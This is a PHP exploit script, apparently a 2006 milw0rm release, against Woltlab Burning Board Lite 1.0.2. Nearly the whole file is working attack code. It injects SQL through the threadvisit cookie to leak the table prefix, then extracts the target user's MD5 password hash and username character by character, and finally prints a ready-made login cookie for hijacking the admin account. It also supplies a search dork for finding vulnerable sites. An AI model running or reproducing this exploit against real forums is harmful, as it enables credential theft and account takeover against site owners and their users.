<?php
print_r('
--------------------------------------------------------------------------------
Woltlab Burning Board Lite 1.0.2 decode_cookie() sql injection exploit
by rgod retrog@alice.it
site: http://retrogod.altervista.org
dork: "Powered by Burning Board Lite 1.0.2 * 2001-2004"
--------------------------------------------------------------------------------
');
/*
works regardless of php.ini settings
*/
if ($argc<5) {
    print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path threadid uid OPTIONS
host:      target server (ip/hostname)
path:      path to wbblite
threadid:  existing thread (a number)
userid:    victim userid (a number, should be 1 for admin)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /wbblite/ 1 1 -P1.1.1.1:80
 "       "       localhost / 2 1 -p81
---------------------------------------------------------------------------------
');
    die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$threadid=(int)$argv[3];
$uid=(int)$argv[4];
$port=80;
$proxy="";
for ($i=5; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

//disclose prefix...
$sql="$threadid,999999999999999'";
$data="goto=firstnew";
$packet ="POST ".$p."thread.php?threadid=$threadid HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: threadvisit=$sql;\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("Invalid SQL",$html)){
    $temp=explode("postid FROM",$html);
    $temp2=explode("posts WHERE",$temp[1]);
    $prefix=$temp2[0];
    echo "vulnerable... prefix -> ".$prefix."\n";
}
else{
    die("not vulnerable...");
}
echo "pwd hash (md5) -> ";
$hash="";
for ($i=1; $i<=32; $i++){
    //bad char = ,
    //this bypass magic quotes because of a stripslashes() in global.php
    //we have to cycle because polls is int(11)
    $sql="$threadid,999999999999999'/**/UNION/**/SELECT/**/ORD(SUBSTRING(password/**/FROM/**/$i/**/FOR/**/1))/**/FROM/**/".$prefix."users/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
    $data="goto=firstnew";
    $packet ="POST ".$p."thread.php?threadid=$threadid HTTP/1.0\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: threadvisit=$sql;\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $packet.=$data;
    sendpacketii($packet);
    $temp=explode("#post",$html);
    $temp2=explode("\n",$temp[1]);
    echo chr((int)$temp2[0]);
    $hash.=chr((int)$temp2[0]);
}
echo "\n";
$sql="$threadid,999999999999999'/**/UNION/**/SELECT/**/LENGTH(username)/**/FROM/**/".$prefix."users/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
$data="goto=firstnew";
$packet ="POST ".$p."thread.php?threadid=$threadid HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: threadvisit=$sql;\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("#post",$html);
$temp2=explode("\n",$temp[1]);
$my_len=(int)$temp2[0];
//echo "username length -> ".$my_len."\n";

echo "username       -> ";
for ($i=1; $i<=$my_len; $i++){
    $sql="$threadid,999999999999999'/**/UNION/**/SELECT/**/ORD(SUBSTRING(username/**/FROM/**/$i/**/FOR/**/1))/**/FROM/**/".$prefix."users/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
    $data="goto=firstnew";
    $packet ="POST ".$p."thread.php?threadid=$threadid HTTP/1.0\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: threadvisit=$sql;\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $packet.=$data;
    sendpacketii($packet);
    $temp=explode("#post",$html);
    $temp2=explode("\n",$temp[1]);
    echo chr((int)$temp2[0]);
    $user.=chr((int)$temp2[0]);
}
echo "\n";
function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

if (is_hash($hash)) {
    print_r('
exploit succeeded, try this cookie:
wbb_userid='.$uid.'; wbb_userpassword='.$hash.';
');
}
else {
    echo "exploit failed...\n";
}
?>

# milw0rm.com [2006-11-24]
